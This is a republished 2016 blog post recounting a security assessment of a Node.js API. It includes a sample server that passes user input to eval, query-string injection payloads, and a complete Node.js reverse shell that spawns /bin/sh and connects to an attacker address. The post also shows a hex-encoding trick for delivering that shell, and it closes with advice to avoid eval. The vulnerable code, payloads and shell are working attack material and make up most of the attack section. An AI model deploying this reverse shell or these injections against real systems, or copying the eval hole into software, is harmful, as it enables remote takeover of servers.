---
template: post
title: Reverse shell on a Node.js application
date: "2016-05-30"
author: Van-Duyet Le
tags:
- Nodejs
- Reverse shell
- Security
- Node.js
- vulnerable
modified_time: '2016-05-30T23:12:07.074+07:00'
blogger_id: tag:blogger.com,1999:blog-3454518094181460838.post-4949924599594903184
blogger_orig_url: https://blog.duyet.net/2016/05/reverse-shell-on-nodejs-application.html
slug: /2016/05/reverse-shell-on-nodejs-application.html
category: Javascript
description: How we obtained a Javascript reverse shell by exploiting a vulnerability on a Node.js application during a security assessment.
fbCommentUrl: none
---

How we obtained a Javascript reverse shell by exploiting a vulnerability on a Node.js application during a security assessment.

## Introduction ##
We were tasked by a small web developer team to perform a security assessment of their mobile app backend which is a REST API.

The architecture is rather simple there is only three Linux servers.

- Node.js
- MongoDB
- Redis

First we performed a few arbitrary tests without access to the source code and we discovered that a few unexpected input at some endpoints would crash the backend application.
We also noticed that the redis server was accessible from the WAN without authentication.

Our next step was to review the Node.js API code and understand the crashes.

## Simplified vulnerable application ##
We created this small Node.js application with the vulnerable function if you want to try to exploit it yourself.
This Node.js web server will wait for a query such as `http://target.tld//?name=do*` and search for animal names matching that query.

```
'use strict'
const http = require('http');
const url = require('url');
const path = require('path');

const animalsJSON = path.join(__dirname, 'animals.json');
const animals = require(animalsJSON);

function requestHandler(req, res) {
    let urlParams = url.parse(req.url, true);
    let queryData = urlParams.query;
    res.writeHead(200, {"Content-Type": "application/json"});

    if (queryData.name) {
        let searchQuery = stringToRegexp(queryData.name);
        let animalsResult = getAnimals(searchQuery);
        res.end(JSON.stringify(animalsResult));
    } else {
        res.end();
    }
}

function getAnimals(query) {
    let result = [];

    for (let animal of animals) {
        if (query.test(animal.name))
            result.push(animal);
    }

    return result;
}

function stringToRegexp(input) {
    let output = input.replace(/[\[\]\\\^\$\.\|\?\+\(\)]/, "\\$&");
    let prefix, suffix;

    if (output[0] == '*') {
        prefix = '/';
        output = output.replace(/^\*+/g, '');
    } else {
        prefix = '/^';
    }

    if (output[output.length - 1] == '*') {
        suffix = '/i';
        output = output.replace(/\*+$/g, '');
    } else {
        suffix = '$/i';
    }
    output = output.replace(/[\*]/, '.*');

    return eval(prefix + output + suffix);
}

const server = http.createServer(requestHandler);
server.listen(3000);
```

```
[
    {"name": "Dinosaur"},
    {"name": "Dog"},
    {"name": "Dogfish"},
    {"name": "Dolphin"},
    {"name": "Donkey"},
    {"name": "Dotterel"},
    {"name": "Dove"},
    {"name": "Dragonfly"},
    {"name": "Duck"}
]
```

## The vulnerability ##
After a few minutes of analyzing the buggy endpoints in the code we noticed a bad practice issue that could lead to remote code execution.
The `stringToRegexp` function is evaluating user input to create a `RegExp` object and use it to find elements in an array.

```
return eval(prefix + output + suffix); // we control output value
```

We can insert our own Javascript code in the output variable and execute it.
The stringToRegexp function will escape some characters and the output value will be evaluated.

```
["./;require('util').log('Owned');//*"]
```

Visiting the address below will print a message on the server terminal.
`http://target.tld/?name=["./;require('util').log('Owned');//*"]`

From there it would be nice to execute code to have an interactive shell such as `/bin/sh`.

## The Node.js reverse shell ##
The Javascript code below is a Node.js reverse shell.
The payload will spawn a /bin/sh shell, create a TCP connection to the attacker and attach the shell standard streams to it.

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

To execute the payload gracefully we used a little trick, we encoded our reverse shell payload to hexadecimal and used the Node.js Buffer object to decode it.
`http://target.tld/?name=["./;eval(new Buffer('PAYLOAD', 'hex').toString());//*"]`

## Conclusion ##
It's highly recommended to avoid using the `eval` function in a Javascript project.
The fix was rather simple, they started using using the `RegExp` object directly.
See origin post here: [https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)
